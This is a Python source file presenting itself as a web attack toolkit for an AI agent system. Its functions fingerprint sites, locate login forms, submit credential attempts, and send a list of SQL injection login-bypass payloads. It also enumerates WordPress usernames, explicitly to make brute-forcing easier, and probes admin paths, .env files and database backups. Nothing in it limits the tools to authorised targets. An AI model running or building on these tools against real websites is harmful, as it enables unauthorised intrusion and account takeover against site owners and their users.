"""
Web attack toolkit for T's agent system.
Pure Python — no external tools required beyond httpx (already installed).
"""

import asyncio
import httpx
import re
import json
from urllib.parse import urljoin
from core.logger import get_logger

log = get_logger("agents.web_attack")

_CLIENT_TIMEOUT = httpx.Timeout(15.0)
_HEADERS = {
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}


# ─── Recon ─────────────────────────────────────────────────────────────────────

async def http_fingerprint(url: str, **_) -> str:
    try:
        async with httpx.AsyncClient(timeout=_CLIENT_TIMEOUT, follow_redirects=True) as c:
            r = await c.get(url, headers=_HEADERS)

        lines = [
            f"URL:          {url}",
            f"Final URL:    {r.url}",
            f"Status:       {r.status_code}",
            f"Server:       {r.headers.get('server', 'not disclosed')}",
            f"Powered-By:   {r.headers.get('x-powered-by', 'not disclosed')}",
            f"Content-Type: {r.headers.get('content-type', '?')}",
            "",
            "── Security Headers ──",
        ]
        for h in ["x-frame-options", "x-xss-protection", "x-content-type-options",
                  "strict-transport-security", "content-security-policy"]:
            lines.append(f"  {h}: {r.headers.get(h, 'MISSING')}")

        lines += ["", "── Cookies ──"]
        for name, val in r.cookies.items():
            lines.append(f"  {name}={val[:60]}")

        lines += ["", "── Body Preview (600 chars) ──", r.text[:600]]
        return "\n".join(lines)
    except Exception as e:
        return f"[ERROR] {e}"


async def find_login_form(url: str, **_) -> str:
    try:
        async with httpx.AsyncClient(timeout=_CLIENT_TIMEOUT, follow_redirects=True) as c:
            r = await c.get(url, headers=_HEADERS)
        body = r.text
        results = []

        forms = re.findall(r'<form[^>]*>.*?</form>', body, re.DOTALL | re.IGNORECASE)
        if not forms:
            forms = re.findall(r'<form[^>]*>.*?(?=<form|$)', body, re.DOTALL | re.IGNORECASE)

        for i, form in enumerate(forms):
            action = re.search(r'action=["\']([^"\']*)["\']', form, re.IGNORECASE)
            method = re.search(r'method=["\']([^"\']*)["\']', form, re.IGNORECASE)
            inputs = re.findall(r'<input[^>]*>', form, re.IGNORECASE)

            action_url = action.group(1) if action else ""
            if action_url and not action_url.startswith("http"):
                action_url = urljoin(str(r.url), action_url)

            fields, hidden = [], []
            for inp in inputs:
                name  = re.search(r'name=["\']([^"\']*)["\']',  inp, re.IGNORECASE)
                type_ = re.search(r'type=["\']([^"\']*)["\']',  inp, re.IGNORECASE)
                val   = re.search(r'value=["\']([^"\']*)["\']', inp, re.IGNORECASE)
                if name:
                    info = f"  name={name.group(1)}  type={type_.group(1) if type_ else 'text'}"
                    if val:
                        info += f"  value={val.group(1)}"
                    (hidden if type_ and type_.group(1).lower() == "hidden" else fields).append(info)

            results.append(
                f"Form #{i+1}:\n"
                f"  action: {action_url or '(same page)'}\n"
                f"  method: {method.group(1).upper() if method else 'GET'}\n"
                f"  visible fields:\n" + "\n".join(f"    {f}" for f in fields) + "\n"
                f"  hidden fields (CSRF etc):\n" + "\n".join(f"    {h}" for h in hidden)
            )

        if not results:
            return f"No forms found at {url}.\nTitle: {_extract_title(body)}\nSnippet:\n{body[:400]}"
        return f"Found {len(results)} form(s) at {url}:\n\n" + "\n\n".join(results)
    except Exception as e:
        return f"[ERROR] {e}"


async def probe_login(url: str, username_field: str, password_field: str,
                      username: str, password: str, extra_fields: str = "", **_) -> str:
    """
    Submit one login attempt. Returns the RAW response — status, redirect, cookies, body.
    DOES NOT interpret success/failure — the agent reads the raw output and decides.
    """
    try:
        extra = json.loads(extra_fields) if extra_fields else {}
    except Exception:
        extra = {}

    data = {username_field: username, password_field: password, **extra}

    try:
        async with httpx.AsyncClient(
            timeout=_CLIENT_TIMEOUT,
            follow_redirects=False,
        ) as c:
            get_r    = await c.get(url, headers=_HEADERS)
            cookies  = dict(get_r.cookies)
            if not extra:
                csrf = _extract_csrf(get_r.text)
                if csrf:
                    data.update(csrf)

            r = await c.post(url, data=data, headers=_HEADERS, cookies=cookies)
            all_cookies = {**cookies, **dict(r.cookies)}

        redirect  = r.headers.get("location", "none")
        set_cookie_header = r.headers.get("set-cookie", "none")

        # Extract all session/auth cookies from response
        auth_cookies = {
            k: v for k, v in r.cookies.items()
            if any(x in k.lower() for x in ["session", "auth", "token", "logged", "wordpress", "login", "user"])
        }

        return (
            f"── Login Attempt ──\n"
            f"  credentials: {username!r} / {password!r}\n"
            f"  data sent:   {data}\n"
            f"\n── Raw Response ──\n"
            f"  status:      {r.status_code}\n"
            f"  location:    {redirect}\n"
            f"  set-cookie:  {set_cookie_header[:200]}\n"
            f"  auth cookies found: {auth_cookies}\n"
            f"\n── Body (first 500 chars) ──\n"
            f"{r.text[:500]}"
        )
    except Exception as e:
        return f"[ERROR] {e}"


async def sql_injection_login(url: str, username_field: str, password_field: str, **_) -> str:
    """
    Test login form for SQL injection bypass.
    Returns RAW response for each payload — no fabricated verdicts.
    The agent reads the actual redirect destinations and cookies to determine success.
    """
    payloads = [
        ("' OR '1'='1",          "' OR '1'='1"),
        ("admin'--",             "x"),
        ("admin' #",             "x"),
        ("' OR 1=1--",           "x"),
        ("') OR ('1'='1",        "x"),
        ("' OR 'x'='x",          "x"),
        ("admin' OR '1'='1'--",  "x"),
        ("' OR 1=1#",            "x"),
        ("\" OR \"1\"=\"1",      "x"),
        ("admin\"--",            "x"),
        ("1 OR 1=1",             "1 OR 1=1"),
        ("admin' OR 1=1--",      "x"),
    ]

    results = ["SQL Injection Bypass Attempts — RAW RESULTS ONLY:\n"]

    try:
        async with httpx.AsyncClient(timeout=_CLIENT_TIMEOUT, follow_redirects=False) as c:
            get_r       = await c.get(url, headers=_HEADERS)
            base_cookies = dict(get_r.cookies)
            base_csrf    = _extract_csrf(get_r.text)

            # Baseline: what does a known-bad login look like?
            bad_data = {username_field: "definitly_not_real_user_xyz", password_field: "wrongpass123"}
            if base_csrf:
                bad_data.update(base_csrf)
            baseline = await c.post(url, data=bad_data, headers=_HEADERS, cookies=base_cookies)
            baseline_redirect = baseline.headers.get("location", "none")
            results.append(
                f"[BASELINE — known bad login]\n"
                f"  status={baseline.status_code}  location={baseline_redirect}\n"
            )

            for uname, passwd in payloads:
                data = {username_field: uname, password_field: passwd}
                if base_csrf:
                    # Fresh CSRF per attempt for WordPress
                    fresh = await c.get(url, headers=_HEADERS)
                    fresh_csrf = _extract_csrf(fresh.text)
                    fresh_cookies = dict(fresh.cookies)
                    if fresh_csrf:
                        data.update(fresh_csrf)
                else:
                    fresh_cookies = base_cookies

                try:
                    r        = await c.post(url, data=data, headers=_HEADERS, cookies=fresh_cookies)
                    redirect = r.headers.get("location", "none")
                    cookies  = {k: v[:40] for k, v in r.cookies.items()}
                    differs  = redirect != baseline_redirect

                    results.append(
                        f"payload: user={uname!r}\n"
                        f"  status={r.status_code}  location={redirect}\n"
                        f"  cookies={cookies}\n"
                        f"  DIFFERS_FROM_BASELINE={differs}\n"
                        f"  body_snippet={r.text[:150]!r}\n"
                    )

                    await asyncio.sleep(0.5)
                except Exception as e:
                    results.append(f"payload {uname!r}: [ERROR] {e}\n")

    except Exception as e:
        return f"[ERROR] {e}"

    results.append(
        "\nINSTRUCTION: Compare each result to BASELINE. "
        "A different redirect location or new auth cookie = potential bypass. "
        "Do NOT report success unless the redirect destination is different from baseline "
        "AND points away from the login page."
    )
    return "\n".join(results)


async def fetch_page_with_cookies(url: str, cookies: str = "", **_) -> str:
    try:
        jar = json.loads(cookies) if cookies else {}
    except Exception:
        jar = {}
    try:
        async with httpx.AsyncClient(timeout=_CLIENT_TIMEOUT, follow_redirects=True) as c:
            r = await c.get(url, headers=_HEADERS, cookies=jar)
        return (
            f"Status: {r.status_code}\n"
            f"Final URL: {r.url}\n"
            f"Cookies set: {dict(r.cookies)}\n"
            f"Body:\n{r.text[:1500]}"
        )
    except Exception as e:
        return f"[ERROR] {e}"


async def wordpress_user_enum(base_url: str, **_) -> str:
    """
    WordPress-specific: enumerate valid usernames via author archive, REST API, and login error messages.
    Valid usernames make brute force far more effective.
    """
    base = base_url.rstrip("/").replace("/wp-login.php", "")
    found_users = set()
    results     = ["WordPress User Enumeration:\n"]

    async with httpx.AsyncClient(timeout=_CLIENT_TIMEOUT, follow_redirects=True) as c:
        # Method 1: REST API
        try:
            r = await c.get(f"{base}/wp-json/wp/v2/users", headers=_HEADERS)
            if r.status_code == 200:
                users = r.json()
                for u in users:
                    name = u.get("slug") or u.get("name", "")
                    if name:
                        found_users.add(name)
                results.append(f"REST API (/wp-json/wp/v2/users): {[u.get('slug') for u in users]}")
            else:
                results.append(f"REST API: blocked ({r.status_code})")
        except Exception as e:
            results.append(f"REST API: error {e}")

        # Method 2: author archive enumeration (IDs 1–5)
        for uid in range(1, 6):
            try:
                r = await c.get(f"{base}/?author={uid}", headers=_HEADERS)
                # If redirect contains /author/username/ we have a username
                final = str(r.url)
                m = re.search(r'/author/([^/]+)/', final)
                if m:
                    found_users.add(m.group(1))
                    results.append(f"Author ID {uid} → {m.group(1)}")
            except Exception:
                pass

        # Method 3: login error differentiation
        # WordPress says "invalid username" vs "incorrect password" — reveals valid usernames
        test_names = list(found_users) or ["admin", "administrator", "user", "test", "wordpress"]
        results.append("\nLogin error enumeration:")
        for name in test_names[:5]:
            try:
                r = await c.post(
                    f"{base}/wp-login.php",
                    data={"log": name, "pwd": "definitely_wrong_xyz_123!", "wp-submit": "Log In"},
                    headers=_HEADERS,
                )
                body = r.text
                if "incorrect password" in body.lower() or "the password you entered" in body.lower():
                    found_users.add(name)
                    results.append(f"  {name!r} → VALID USERNAME (wrong password error)")
                elif "invalid username" in body.lower() or "is not registered" in body.lower():
                    results.append(f"  {name!r} → invalid username")
                else:
                    results.append(f"  {name!r} → unclear: {body[:100]!r}")
            except Exception as e:
                results.append(f"  {name!r} → error: {e}")

    if found_users:
        results.append(f"\nCONFIRMED VALID USERNAMES: {sorted(found_users)}")
    else:
        results.append("\nNo usernames confirmed. Try common names: admin, administrator, editor")

    return "\n".join(results)


async def directory_enum(base_url: str, wordlist: str = "common", **_) -> str:
    common_paths = [
        "admin", "admin/", "administrator", "login", "wp-admin", "phpmyadmin",
        "dashboard", "panel", "cpanel", "manager", "admin.php", "login.php",
        "admin/login", "admin/login.php", "user/login", "auth/login", "signin",
        "wp-login.php", "xmlrpc.php", "wp-json/wp/v2/users",
        ".env", "config.php", "configuration.php", "robots.txt",
        "sitemap.xml", ".htaccess", "api", "api/v1", "swagger",
        "backup", "backup.zip", "backup.sql", "db.sql",
    ]
    admin_paths = [
        "admin", "admin/", "admin/index.php", "admin/login.php",
        "administrator/", "administrator/index.php", "admincp/",
        "adminpanel/", "admin_area/", "moderator/", "webadmin/",
        "cpanel/", "panel/", "wp-admin/", "wp-login.php",
    ]
    paths = admin_paths if wordlist == "admin" else common_paths
    base  = base_url.rstrip("/")
    found = []

    async with httpx.AsyncClient(timeout=httpx.Timeout(8.0), follow_redirects=False) as c:
        responses = await asyncio.gather(
            *[c.get(f"{base}/{p}", headers=_HEADERS) for p in paths],
            return_exceptions=True,
        )

    for path, resp in zip(paths, responses):
        if isinstance(resp, Exception):
            continue
        if resp.status_code in [200, 301, 302, 403]:
            loc = resp.headers.get("location", "")
            found.append(f"  [{resp.status_code}] /{path}  {('→ ' + loc) if loc else ''}")

    if not found:
        return f"No interesting paths found on {base_url} ({len(paths)} paths checked)"
    return f"Found {len(found)} paths on {base_url}:\n" + "\n".join(found)


# ─── Helpers ───────────────────────────────────────────────────────────────────

def _extract_csrf(html: str) -> dict:
    patterns = [
        r'<input[^>]+name=["\'](_token|csrf_token|csrfmiddlewaretoken|authenticity_token|__RequestVerificationToken|wpnonce)["\'][^>]+value=["\']([^"\']+)["\']',
        r'<input[^>]+value=["\']([^"\']{20,})["\'][^>]+name=["\'](_token|csrf_token|wpnonce)["\']',
        r'<meta[^>]+name=["\']csrf-token["\'][^>]+content=["\']([^"\']+)["\']',
    ]
    for pat in patterns:
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            groups = m.groups()
            known  = {"_token", "csrf_token", "csrfmiddlewaretoken",
                      "authenticity_token", "__RequestVerificationToken", "wpnonce"}
            if len(groups) == 2:
                field = groups[0] if groups[0] in known else groups[1]
                token = groups[1] if groups[0] == field else groups[0]
                return {field: token}
            return {"csrf_token": groups[0]}
    return {}


def _extract_title(html: str) -> str:
    m = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
    return re.sub(r'<[^>]+>', '', m.group(1)).strip() if m else "no title"
